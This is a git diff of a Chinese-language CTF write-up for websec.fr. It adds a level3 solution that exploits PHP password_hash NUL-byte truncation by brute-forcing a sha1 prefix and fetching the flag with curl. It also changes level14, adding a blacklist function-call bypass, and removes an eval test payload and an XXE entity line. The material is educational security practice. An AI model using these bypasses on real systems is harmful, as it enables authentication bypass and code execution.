@@ -1,8 +1,10 @@
 ---
-title: WEBSEC-Writeup
+title: websec.fr-writeup
 abbrlink: 7418
 date: 2018-09-04 11:47:34
 tags: ctf
+keywords: websec.fr-writeup
+description: websec.fr-writeup
 ---
 
 # level1
@@ -77,6 +79,74 @@ WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
 ```
 
 
+
+# level3
+
+参考链接:
+
+* http://www.vuln.cn/6880
+* https://stackoverflow.com/questions/49245637/sanitizing-passwords-for-password-hash
+
+第二个测试如下(7.0.30):
+
+```shell
+php > $hash = password_hash("\x00 abc", PASSWORD_DEFAULT);
+php > var_dump(password_verify("\x00 foo", $hash)); // true ???
+bool(true)
+php > $hash = password_hash("\x00 abc", PASSWORD_DEFAULT); 
+php > var_dump(password_verify('\x00 foo', $hash)); // true ???
+bool(false)
+```
+
+我们来看一下sha1函数:
+
+![](/assets/websec/TIM截图20180920220958.png)
+
+sha1($_POST['c'], false)将返回一个40位字符长度的16进制数字，而不是一个20位的字符串。
+
+```php
+<?php
+if(isset($_POST['c'])) {
+    /*  Get rid of clever people that put `c[]=bla`
+     *  in the request to confuse `password_hash`
+     */
+    $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
+
+    echo "<div class='row'>";
+    if (password_verify (sha1($flag, fa1se), $h2) === true) {
+       echo "<p>Here is your flag: <mark>$flag</mark></p>"; 
+    } else {
+        echo "<p>Here is the <em>hash</em> of your flag: <mark>" . sha1($flag, false) . "</mark></p>";
+    }
+    echo "</div>";
+}
+?>
+```
+
+随机输入一个值，我们发现`sha1($flag, false)`的值为`7c00249d409a91ab84e3f421c193520d9fb3674b`。
+
+第三位和第四位都是`0`，所以参考上边的文章，我们只需要找到一个sha1之后的值以`7c00`开头的值即可。
+
+```php
+<?php                                               
+    for($i = 0; $i < 100000000; $i++) {             
+        if(substr(sha1($i, false), 0, 4) == "7c00") {
+            echo substr(sha1($i, false), 0, 4);     
+            echo "\n";                              
+            echo $i;                                
+            break;                                  
+        }                                           
+}
+```
+
+得到`104610`。
+
+getflag:
+
+```
+ht@TIANJI:/mnt/d/wamp64/www/backdoor$ curl -d "c=104610" https://websec.fr/level03/index.php | grep -Eo "WEBSEC{.*}"
+WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
+```
 
 # level4
 
@@ -548,7 +618,7 @@ user_id=4&table=(select 4 id, enemy username from costume)&submit=%E6%8F%90%E4%B
 WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
 ```
 
-# level14
+# level14未解决
 
 ```php
 <?php
@@ -599,20 +669,11 @@ php > $a{1}('ls');
 1.php
 ```
 
-本地测试:
+执行`phpinfo()`
 
 ```
-<?php 
-    $f = "filter_input";
-    $data = $_GET['data'];
-    eval($data);
+$blacklist{562}();
 ```
-
-```
-http://localhost/test.php?l=echo%20123;&data=eval($f(1,%27l%27));
-```
-
-
 
 # level15
 
@@ -1155,8 +1216,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-```
-<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY xxe abc">]><x>&xxe;</x>
 ```
